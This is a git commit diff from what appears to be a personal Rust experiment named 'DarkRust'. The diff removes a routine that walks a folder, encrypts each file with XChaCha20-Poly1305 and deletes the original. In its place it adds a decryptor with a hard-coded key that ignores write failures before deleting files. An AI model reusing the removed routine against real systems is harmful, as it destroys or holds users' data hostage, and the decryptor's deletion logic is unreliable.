a062e511d69aa2766146ae0ef9fa93c20af19f77
hoagie195 <hoagie195@gmail.com>
2023-04-30 09:07:01 -0500

    seperated encrypt and decrypt

--- decryptDarkrs/src/main.rs
+++ decryptDarkrs/src/main.rs
@@ -9,12 +9,8 @@ use std::fs;
 use anyhow::anyhow;
 
 fn main() {
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 24];
-    OsRng.fill_bytes(&mut key);
-    OsRng.fill_bytes(&mut nonce);
-    println!("Key: {:?}", key);
-    println!("Nonce: {:?}", nonce);
+    let mut key = [139, 126, 86, 117, 220, 68, 15, 204, 19, 236, 104, 88, 159, 36, 208, 96, 147, 42, 151, 142, 119, 190, 46, 62, 5, 96, 179, 175, 124, 238, 139, 184];
+    let mut nonce = [217, 190, 79, 64, 1, 171, 39, 85, 8, 221, 229, 225, 84, 144, 247, 133, 247, 188, 255, 36, 174, 157, 189, 203];
     let mut all_files: Vec<DirEntry> = Vec::new();
     for entry in WalkDir::new("C:\\Users\\logan\\Documents\\testDarkRust\\Test3").into_iter().filter_map(|e| e.ok()) {
         if entry.file_type().is_file() {
@@ -30,16 +26,18 @@ fn main() {
     for entry in all_files{
         println!("{}", entry.path().display());
         if let Some(filepath) = entry.path().as_os_str().to_str() {
-            encrypt_sm_file(filepath, &key, &nonce);
+            decrypt_sm_file(filepath, &key, &nonce);
         }
     }
 }
 
-fn encrypt_sm_file(filepath: &str, key: &[u8; 32], nonce: &[u8; 24]) -> Result<(), anyhow::Error> {
-    let contents = fs::read(filepath)?;
+fn decrypt_sm_file(filepath: &str, key: &[u8; 32], nonce: &[u8; 24]) -> Result<(), anyhow::Error> {
     let cipher = XChaCha20Poly1305::new(key.into());
-    let encrypted_file = cipher.encrypt(nonce.into(), contents.as_ref()).map_err(|err| anyhow!("Encrypting small file: {}", err))?;
-    fs::write(filepath.to_owned() + ".encrypted", encrypted_file)?;
+    let contents = fs::read(filepath)?;
+    let decrypted_file = cipher
+        .decrypt(nonce.into(), contents.as_ref())
+        .map_err(|err| anyhow!("Decrypting small file: {}", err))?;
+    fs::write(filepath.replace(".encrypted", ""), decrypted_file);
     fs::remove_file(filepath)?;
     Ok(())
 }
